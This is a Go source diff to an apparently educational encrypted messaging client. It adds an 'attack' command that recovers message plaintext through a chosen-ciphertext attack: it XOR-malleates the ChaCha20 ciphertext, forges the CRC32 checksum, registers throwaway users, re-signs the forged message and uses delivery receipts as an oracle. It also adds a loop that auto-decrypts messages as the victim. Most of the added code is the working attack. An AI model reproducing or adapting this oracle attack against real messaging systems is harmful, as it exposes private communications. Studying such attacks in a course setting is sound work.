@@ -21,6 +21,7 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	mrand "math/rand"
 	"mime/multipart"
 	"net/http"
 	"os"
@@ -414,6 +415,8 @@ func doReadAndSendMessage(recipient string, messageBody string) error {
 	// Now encrypt the message
 	encryptedMessage := encryptMessage([]byte(messageBody), username, pubkey)
 
+	fmt.Println(string(base64.StdEncoding.EncodeToString(encryptedMessage)))
+
 	// Finally, send the encrypted message to the server
 	return sendMessageToServer(username, recipient, []byte(encryptedMessage), 0)
 }
@@ -610,7 +613,6 @@ func decodePrivateSigningKey(privKey PrivKeyStruct) ecdsa.PrivateKey {
 		return result
 	}
 
-	fmt.Println(sigKeyBytes)
 	sigKey, err := x509.ParsePKCS8PrivateKey(sigKeyBytes)
 	if err != nil {
 		fmt.Println(err)
@@ -648,12 +650,12 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 
 	messageDecoded, err := base64.StdEncoding.DecodeString(payload)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 	err = json.Unmarshal([]byte(messageDecoded), &decrypted)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
@@ -666,32 +668,32 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	// decoding signing public key
 	pubKeyBytes, err := base64.StdEncoding.DecodeString(senderPubKey.SigPK)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 	pubKeyIF, err := x509.ParsePKIXPublicKey(pubKeyBytes)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 	pubSigKey, flg := pubKeyIF.(*ecdsa.PublicKey)
 	if !flg {
-		fmt.Println("error decoding public key")
+		// fmt.Println("error decoding public key")
 		return make([]byte, 0), err
 	}
 
 	// Decoding signature
 	Sig, err := base64.StdEncoding.DecodeString(decrypted.Sig)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
 	// verifying the signature
 	valid := ecdsa.VerifyASN1(pubSigKey, toVerifyHashed[:], Sig)
 	if !valid {
-		fmt.Println("Can't Verify the signature!!")
-		return make([]byte, 0), err
+		// fmt.Println("Can't Verify the signature!!")
+		return make([]byte, 0), errors.New("Can't Verify the signature!!")
 	}
 
 	// Decode C1
@@ -700,7 +702,7 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	epkECDSA := epkIF.(*ecdsa.PublicKey)
 	epk, err := epkECDSA.ECDH()
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
@@ -710,14 +712,14 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	eskECDSA := *eskECDSAIF.(*ecdsa.PrivateKey)
 	esk, err := eskECDSA.ECDH()
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
 	// Generating shared secret
 	ssk, err := esk.ECDH(epk)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
@@ -728,14 +730,14 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 
 	cipher, err := chacha20.NewUnauthenticatedCipher(K, make([]byte, chacha20.NonceSize)) // nonce size = 12
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
 	// Decode C2
 	C2_, err := base64.StdEncoding.DecodeString(decrypted.C2)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return make([]byte, 0), err
 	}
 
@@ -757,18 +759,18 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	check := []byte(M_[(len(M_) - 4):])
 
 	if string(check) != string(checkByte) {
-		fmt.Println("checksum couldnot be verified")
+		// fmt.Println("checksum couldnot be verified")
 		return make([]byte, 0), errors.New("checksum couldnot be verified")
 	}
 
 	// verify sender
 	separatorIndex := bytes.IndexByte(M_, 0x3A)
 	if separatorIndex == -1 {
-		fmt.Println("invalid message format, couldn't find ':' ")
+		// fmt.Println("invalid message format, couldn't find ':' ")
 		return make([]byte, 0), errors.New("invalid message format, couldn't find ':' ")
 	}
 	if senderUsername != string(M_[:separatorIndex]) {
-		fmt.Println("Can't verify sender username to be same")
+		// fmt.Println("Can't verify sender username to be same")
 		return make([]byte, 0), errors.New("Can't verify sender username to be same")
 	}
 
@@ -891,16 +893,16 @@ func decryptMessages(messageArray []MessageStruct) {
 		var result PubKeyStruct
 		if err := json.Unmarshal(body, &result); err != nil { // Parse []byte to go struct pointer
 			fmt.Println("Can not unmarshal JSON")
-			return
+			continue
 		}
 		if msg.Payload == "" {
-			return
+			continue
 		}
 
 		message, err := decryptMessage(msg.Payload, msg.From, &result, &globalPrivKey)
 		if err != nil {
 			fmt.Println(err)
-			return
+			continue
 		}
 
 		if len(message) >= 10 && strings.HasPrefix(string(message), ">>>MSGURL=") {
@@ -927,7 +929,7 @@ func decryptMessages(messageArray []MessageStruct) {
 				messageArray[i].localPath = localPath
 			} else {
 				fmt.Println(err)
-				return
+				continue
 			}
 
 			// decrypt attachment
@@ -935,7 +937,7 @@ func decryptMessages(messageArray []MessageStruct) {
 			err = decryptAttachment(K, hash, localPath, plaintextFilePath)
 			if err != nil {
 				fmt.Println(err)
-				return
+				continue
 			}
 
 		}
@@ -945,7 +947,7 @@ func decryptMessages(messageArray []MessageStruct) {
 		err = sendMessageToServer(msg.To, msg.From, make([]byte, 0), 1)
 		if err != nil {
 			fmt.Println(err)
-			return
+			continue
 		}
 	}
 }
@@ -1038,6 +1040,237 @@ func getTempFilePathDec() string {
 	randBytes := make([]byte, 16)
 	rand.Read(randBytes)
 	return filepath.Join(os.TempDir(), "DECFILE_"+hex.EncodeToString(randBytes)+".txt")
+}
+
+func xorByteAtIndex(b []byte, index int, targetChar byte) []byte {
+	temp := make([]byte, 1)
+	temp[0] = b[index] ^ targetChar
+	b[index] ^= targetChar
+	return temp
+}
+
+func mallChecksum(b []byte, temp []byte) []byte {
+
+	checkByte := calculateChecksum(temp)
+	zeroCheck := calculateChecksum(make([]byte, len(b)-4))
+	for i := 0; i < 4; i++ {
+		b[len(b)-4+i] = b[len(b)-4+i] ^ checkByte[i] ^ zeroCheck[i]
+	}
+	return b[len(b)-4:]
+}
+
+func calculateChecksum(temp []byte) []byte {
+	crcTable := crc32.MakeTable(crc32.IEEE)
+	check := crc32.Checksum(temp, crcTable)
+
+	// convert check to byte[]
+	checkByte := make([]byte, 4)
+	_ = checkByte
+
+	// convert check to little endian encoding as byte[]
+	binary.LittleEndian.PutUint32(checkByte, check)
+	return checkByte
+}
+
+func createNewUserAttack(newUsername string) {
+	// If we are registering a new username, let's do that first
+	err := registerUserWithServer(newUsername, password)
+	if err != nil {
+		fmt.Println("Unable to register username with server (user may already exist)")
+	}
+
+	// Connect and log in to the server
+	newAPIkey, err := serverLogin(newUsername, password)
+	if err != nil {
+		fmt.Println("Unable to connect to server, exiting.")
+		os.Exit(1)
+	}
+	apiKey = newAPIkey
+
+	// Generate a fresh public key, then upload it to the server
+	globalPubKey, globalPrivKey, err = generatePublicKey()
+	_ = globalPrivKey // This suppresses a Golang "unused variable" error
+	if err != nil {
+		fmt.Println("Unable to generate public key, exiting.")
+		os.Exit(1)
+	}
+
+	err = registerPublicKeyWithServer(newUsername, globalPubKey)
+	if err != nil {
+		fmt.Println("Unable to register public key with server, exiting.")
+		os.Exit(1)
+	}
+}
+
+func registerRandomUser(length int) string {
+	letters := []rune("abcdefghijklmnopqrstuvwxyz")
+	mrand.Seed(time.Now().UnixNano())
+	randomString := make([]rune, length)
+	for i := range randomString {
+		randomString[i] = letters[mrand.Intn(len(letters))]
+	}
+	createNewUserAttack(string(randomString))
+	return string(randomString)
+}
+
+func calculateDifference(oldUsername string, newUsername string) []byte {
+	difference := make([]byte, len([]byte(oldUsername)))
+
+	for i := 0; i < len(difference); i++ {
+		difference[i] = byte(oldUsername[i] ^ newUsername[i])
+	}
+	username = newUsername
+	return difference
+}
+
+func attackMessage(sender string, recipient string, payload string) (string, error) {
+	var decrypted CiphertextStruct
+
+	username = sender + ":"
+	sender += ":"
+
+	messageDecoded, err := base64.StdEncoding.DecodeString(payload)
+	if err != nil {
+		fmt.Println(err)
+		return "", err
+	}
+	err = json.Unmarshal([]byte(messageDecoded), &decrypted)
+	if err != nil {
+		fmt.Println(err)
+		return "", err
+	}
+
+	// Decode C2
+	C2, err := base64.StdEncoding.DecodeString(decrypted.C2)
+	if err != nil {
+		fmt.Println(err)
+		return "", err
+	}
+
+	// fmt.Println(" ----> ", []byte(C2), "\n")
+
+	for usernameLength := len(sender); usernameLength < len(C2)-4; usernameLength++ {
+		username = sender
+		tempC2 := make([]byte, len(C2))
+		copy(tempC2, C2)
+		newUsername := registerRandomUser(usernameLength)
+		differenceUsername := calculateDifference(username, newUsername)
+		// fmt.Println(" ----> ", newUsername, "\n")
+
+		// fmt.Println(" ----> ", differenceUsername, "\n")
+
+		// mall the ciphertext to get the ciphertext with random username
+		for i := 0; i < usernameLength; i++ {
+			_ = xorByteAtIndex(tempC2, i, differenceUsername[i])
+		}
+		mallByte := make([]byte, len(tempC2)-4)
+		copy(mallByte, differenceUsername)
+
+		// fmt.Println(" ----> ", mallByte, "\n")
+
+		for i := byte(0); i < byte(255); i++ {
+			messageIDCounter = (usernameLength*256 + int(i))
+			// fmt.Println(messageIDCounter)
+			// copy of malled ciphertext with username
+			tC2_ := make([]byte, len(tempC2))
+			copy(tC2_, tempC2)
+			mallByte[usernameLength] = i
+			// fmt.Println(" |||----> ", mallByte, "\n")
+
+			// tC2_[usernameLength] ^= i
+			// _ = xorByteAtIndex(tC2_, usernameLength, byte(i))
+
+			tC2_[usernameLength] = tC2_[usernameLength] ^ byte(i)
+			_ = mallChecksum(tC2_, mallByte)
+
+			// fmt.Println(" ----> ", tC2_, "\n")
+
+			C2Base64 := base64.StdEncoding.EncodeToString(tC2_)
+
+			// creating toSign and hashing it
+			toSign_ := decrypted.C1 + C2Base64
+			h := sha256.New()
+			h.Write([]byte(toSign_))
+			toSign := h.Sum(nil)
+
+			// Signing the message using ECDSA
+			sig := ECDSASign(toSign, globalPrivKey)
+			Sig := base64.StdEncoding.EncodeToString(sig)
+			cipherMessage := CiphertextStruct{decrypted.C1, C2Base64, Sig}
+
+			secret, err := json.Marshal(cipherMessage)
+			if err != nil {
+				return "", err
+			}
+			err = sendMessageToServer(username, recipient, []byte(secret), 0)
+			if err != nil {
+				fmt.Println("ASdadasd")
+				return "", err
+			}
+			time.Sleep(50 * time.Millisecond)
+			messageList, err := getMessagesFromServer()
+			if err != nil {
+				fmt.Print("Unable to fetch messages: ")
+				fmt.Print(err)
+			} else {
+				flag := false
+				for j := 0; j < len(messageList); j++ {
+					if messageList[j].ReceiptID != 0 {
+						fmt.Println(" ----> i = ", i, "\n")
+						sender += string(byte(':') ^ byte(i))
+						username = sender
+						fmt.Println(sender)
+						flag = true
+						break
+					}
+				}
+				if flag {
+					break
+				}
+			}
+		}
+	}
+
+	return sender[bytes.IndexByte([]byte(sender), 0x3A)+1:], nil
+}
+
+func loopGetDecrypt() {
+	geturl := serverProtocol + "://" + serverDomainAndPort + "/getMessages/" +
+		username + "/" + apiKey
+
+	// Make the request to the server
+	_, body, _ := doGetRequest(geturl)
+
+	// Parse JSON into an array of MessageStructs
+	var messageArray []MessageStruct
+	_ = json.Unmarshal(body, &messageArray)
+
+	// download any attachments before decoding
+	// downloadAttachments(result) // TODO: include url in database
+
+	// decrypt message
+	for i, msg := range messageArray {
+		body := getKeyFromServer(msg.From)
+
+		var result PubKeyStruct
+		if err := json.Unmarshal(body, &result); err != nil { // Parse []byte to go struct pointer
+			continue
+		}
+		if msg.Payload == "" {
+			continue
+		}
+
+		message, err := decryptMessage(msg.Payload, msg.From, &result, &globalPrivKey)
+		if err != nil {
+			continue
+		}
+
+		messageArray[i].decrypted = string(message)
+		err = sendMessageToServer(msg.To, msg.From, make([]byte, 0), 1)
+		if err != nil {
+			continue
+		}
+	}
 }
 
 // Generate a fresh public key struct, containing encryption and signing keys
@@ -1254,10 +1487,26 @@ func main() {
 					fmt.Println("--- message sent successfully!")
 				}
 			}
+		case "ATTACK":
+			if len(parts) < 4 {
+				fmt.Println("Correct usage: attack <sender> <recipient> <payload>")
+			} else {
+				message, err := attackMessage(strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2]), strings.TrimSpace(parts[3]))
+				if err != nil {
+					fmt.Println("--- ERROR: attacking message ", err)
+				} else {
+					fmt.Println("ATTACK SUCCESSFULL!!\n\n", message)
+				}
+			}
+		case "BOB":
+			for {
+				loopGetDecrypt()
+				time.Sleep(20 * time.Millisecond)
+			}
 		case "QUIT":
 			running = false
 		case "HELP":
-			fmt.Println("Commands are:\n\tsend <username> - send a message\n\tget - get new messages\n\tlist - print a list of all users\n\tquit - exit")
+			fmt.Println("Commands are:\n\tsend <username> - send a message\n\tget - get new messages\n\tlist - print a list of all users\n\tattack - attack a particular message\n\tquit - exit")
 
 		default:
 			fmt.Println("Unrecognized command\n")
